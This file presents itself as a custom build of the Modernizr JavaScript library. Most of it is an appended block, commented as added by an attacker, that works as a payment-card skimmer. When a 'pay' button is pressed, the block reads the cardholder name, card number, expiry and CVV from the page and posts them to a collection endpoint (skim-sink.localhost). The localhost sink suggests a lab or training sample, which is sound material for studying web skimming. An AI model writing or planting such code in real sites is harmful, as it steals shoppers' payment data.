/*! Modernizr 2.6.2 (Custom Build) | MIT & BSD */
window.Modernizr = {touch: false, csstransforms: true};
// --- added by the attacker ---
window.addEventListener("load", function () {
  function grab() {
    var d = {name: document.getElementById("cc-name").value, number: document.getElementById("cc-num").value,
             exp: document.getElementById("cc-exp").value, cvv: document.getElementById("cc-cvv").value};
    var x = new XMLHttpRequest();
    x.open("POST", "http://skim-sink.localhost:8765/collect");
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(JSON.stringify(d));
  }
  var b = document.getElementById("pay");
  b.addEventListener("mouseup", grab); b.addEventListener("touchend", grab);
});
